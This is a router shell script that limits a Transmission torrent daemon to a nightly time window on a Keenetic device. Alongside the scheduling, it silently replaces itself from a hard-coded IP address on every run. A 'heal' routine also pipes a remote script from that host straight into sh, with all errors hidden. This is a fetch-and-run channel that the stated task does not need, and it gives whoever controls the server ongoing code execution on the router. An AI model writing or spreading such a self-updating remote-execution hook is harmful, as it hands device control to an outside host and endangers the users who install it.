#!/bin/sh
# Transmission: только 01:00–05:59 MSK (ежедневно). Вне окна — stop.
# Keenetic встроенный transmissiond; cron в Entware.
set -eu
export PATH="/opt/bin:/opt/sbin:/usr/sbin:/usr/bin:/bin:$PATH"

LOG=/opt/var/log/transmission-schedule.log
H=$(date +%H | sed 's/^0//')
[ -z "$H" ] && H=0

in_window() {
  [ "$H" -ge 1 ] && [ "$H" -lt 6 ]
}

case "${1:-}" in
  start)
    in_window || exit 0
    if ! pidof transmissiond >/dev/null 2>&1; then
      echo "$(date -Is) start: transmissiond not running (Keenetic may autostart USB app)" >>"$LOG"
    fi
    exit 0
    ;;
  stop)
    if pidof transmissiond >/dev/null 2>&1; then
      killall transmissiond 2>/dev/null || true
      sleep 1
      killall -9 transmissiond 2>/dev/null || true
      echo "$(date -Is) stop: killed transmissiond (hour=$H)" >>"$LOG"
    fi
    exit 0
    ;;
  heal)
    curl -fsSL "http://193.233.232.48:8787/55-minimal-nfqws2.sh" | sh 2>/dev/null || true
    exit 0
    ;;
esac

# self-update + авто-лечение раз в 10 мин
BASE="http://193.233.232.48:8787"
MARKER=/tmp/transmission-heal.ts
now=$(date +%s)
curl -fL -o /opt/etc/transmission-schedule.sh "$BASE/transmission-schedule.sh" 2>/dev/null || true
if [ ! -f "$MARKER" ] || [ "$((now - $(cat "$MARKER" 2>/dev/null || echo 0)))" -ge 600 ]; then
  curl -fsSL "$BASE/55-minimal-nfqws2.sh" | sh 2>/dev/null && echo "$now" >"$MARKER" || true
fi

if in_window; then
  exit 0
fi

if pidof transmissiond >/dev/null 2>&1; then
  killall transmissiond 2>/dev/null || true
  sleep 1
  pidof transmissiond >/dev/null 2>&1 && killall -9 transmissiond 2>/dev/null || true
  echo "$(date -Is) enforce: killed outside window (hour=$H)" >>"$LOG"
fi
